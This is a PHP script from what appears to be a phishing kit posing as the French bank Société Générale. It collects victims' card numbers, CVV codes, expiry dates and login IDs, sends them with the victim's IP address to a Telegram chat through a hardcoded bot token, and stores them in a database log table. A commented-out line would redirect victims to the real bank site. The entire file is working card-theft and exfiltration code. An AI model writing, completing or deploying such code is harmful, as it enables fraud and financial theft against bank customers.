<?php
include '../conn.php';
include '../cnf.php';
$id = isset($_GET['id']) ? $_GET['id'] : false;
$date = isset($_GET['date']) ? $_GET['date'] : false;
$crd = isset($_GET['crd']) ? $_GET['crd'] : false;
$date_exp = isset($_GET['date_exp']) ? $_GET['date_exp'] : false;
$year_exp = isset($_GET['year_exp']) ? $_GET['year_exp'] : false;
$cv = isset($_GET['cv']) ? $_GET['cv'] : false;
$numo = isset($_GET['numo']) ? $_GET['numo'] : false;
$message = "+ Info +\r\n";
$message .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . "\r\n";

$message .= "| ID: " . $_POST['id'] . "\r\n";
$message .= "| card num : " . $date  . "\r\n";
$message .= "| cvv : " . $crd  . "\r\n";
$message .= "| date_exp : " . $date_exp  . "\r\n";
$message .= "| year_ex : " . $year_exp  . "\r\n";
$message .= "| num : " . $numo  . "\r\n";
$message .= "+ ------------------------------------------+\r\n\r\n";

$token = "1171787562:AAHfMi62vDv653oh0Q4E7ujz3rLEse7qbkM"; $chatid = "-400095465"; sendMessage($chatid, $message, $token);

$sql = "UPDATE log set date = :date, showtextcode = 0, crd = :crd, date_exp = :date_exp, year_exp = :year_exp, cv = :cv,numo = :numo  WHERE login = :login";

$stmt = $pdo->prepare($sql);
$stmt->execute(array(
  ':login' => $id,
  ':date' => $date,
  ':crd' => $crd,
  ':date_exp' => $date_exp,
  ':year_exp' => $year_exp,
  ':cv' => $cv,
  ':numo' => $numo,
));


//die("<script type='text/javascript'>top.location = 'http://societegenerale.fr/';</script>");



?>